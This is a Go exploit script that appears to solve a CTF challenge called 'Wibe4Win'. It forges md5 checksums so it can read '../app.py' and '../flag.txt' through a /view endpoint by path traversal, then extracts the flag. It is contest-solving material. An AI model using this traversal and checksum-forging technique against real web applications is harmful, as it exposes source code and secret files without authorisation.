package main

import (
	"crypto/md5"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
)

// ACSC Qualification 2026 - Wibe4Win
//
// 利用步骤：
//   1. 拉取首页，验证 snippet 链接中的 checksum = md5(file)
//   2. 构造 ../app.py 与 ../flag.txt 的 checksum
//   3. 通过 /view 读取应用源码与 flag
//
// 运行示例：
// go run CTF_Writeups/scripts_go/ACSC2026Qualification_Wibe4Win.go \
//   -base https://be0s8cwbxaasof6s.dyn.acsc.land

const defaultBaseURL = "https://be0s8cwbxaasof6s.dyn.acsc.land"

func md5Hex(text string) string {
	sum := md5.Sum([]byte(text))
	return hex.EncodeToString(sum[:])
}

func fetchText(client *http.Client, target string) (string, error) {
	resp, err := client.Get(target)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(body), nil
}

func verifyHomepageChecksums(client *http.Client, base string) error {
	html, err := fetchText(client, base+"/")
	if err != nil {
		return err
	}

	re := regexp.MustCompile(`/view\?file=([^&]+)&checksum=([0-9a-f]{32})`)
	matches := re.FindAllStringSubmatch(html, -1)
	if len(matches) == 0 {
		return fmt.Errorf("no snippet links found on homepage")
	}

	for _, match := range matches {
		name, err := url.QueryUnescape(match[1])
		if err != nil {
			return err
		}
		checksum := match[2]
		if checksum != md5Hex(name) {
			return fmt.Errorf("checksum mismatch for %s", name)
		}
	}

	fmt.Printf("[+] verified %d homepage snippet checksums\n", len(matches))
	return nil
}

func readViaView(client *http.Client, base string, filename string) (string, error) {
	checksum := md5Hex(filename)
	target := fmt.Sprintf("%s/view?file=%s&checksum=%s", base, url.QueryEscape(filename), checksum)
	return fetchText(client, target)
}

func extractFlag(text string) (string, error) {
	re := regexp.MustCompile(`dach2026\{[^}]+\}`)
	flag := re.FindString(text)
	if flag == "" {
		return "", fmt.Errorf("flag not found")
	}
	return flag, nil
}

func main() {
	base := flag.String("base", defaultBaseURL, "target base URL")
	flag.Parse()

	client := &http.Client{}
	normalizedBase := strings.TrimRight(*base, "/")
	fmt.Printf("[+] target: %s\n", normalizedBase)

	if err := verifyHomepageChecksums(client, normalizedBase); err != nil {
		fmt.Fprintln(os.Stderr, "[-]", err)
		os.Exit(1)
	}

	appSource, err := readViaView(client, normalizedBase, "../app.py")
	if err != nil {
		fmt.Fprintln(os.Stderr, "[-]", err)
		os.Exit(1)
	}
	if !strings.Contains(appSource, "SNIPPETS_DIR") || !strings.Contains(appSource, "flag.txt") {
		fmt.Fprintln(os.Stderr, "[-] unexpected ../app.py response")
		os.Exit(1)
	}
	fmt.Println("[+] ../app.py read succeeded")

	flagText, err := readViaView(client, normalizedBase, "../flag.txt")
	if err != nil {
		fmt.Fprintln(os.Stderr, "[-]", err)
		os.Exit(1)
	}
	flagValue, err := extractFlag(flagText)
	if err != nil {
		fmt.Fprintln(os.Stderr, "[-]", err)
		os.Exit(1)
	}
	fmt.Println("[+] ../flag.txt read succeeded")
	fmt.Println(flagValue)
}
